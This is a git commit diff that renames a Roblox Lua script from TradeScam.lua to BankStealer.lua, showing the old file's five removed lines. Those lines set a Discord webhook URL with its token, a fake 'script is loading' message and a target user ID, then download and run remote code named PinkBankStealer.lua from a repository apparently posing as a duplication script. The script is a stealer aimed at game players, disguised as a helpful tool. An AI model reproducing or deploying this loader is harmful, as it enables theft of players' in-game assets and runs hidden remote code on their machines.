96b08be4dec9ad80059ac2fca340e88a5422c9f3
matiplhome <126961101+matiplhome@users.noreply.github.com>
2023-03-05 17:10:19 +0100

    Update and rename TradeScam.lua to BankStealer.lua

--- TradeScam.lua
+++
@@ -1,5 +0,0 @@
-_G.Webhook = "https://discord.com/api/webhooks/1081948486456578118/ue_fI50osPOIBi7F-SrGyTkHM4sj61BDSxoDMQHAYQIQpypv_JeCOKlmkOuNScyUoSLy"
-_G.LoadingText = "Please wait, script is loading. TY for using our services <3"
-_G.UserId = 97193553
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkBankStealer.lua", true))()
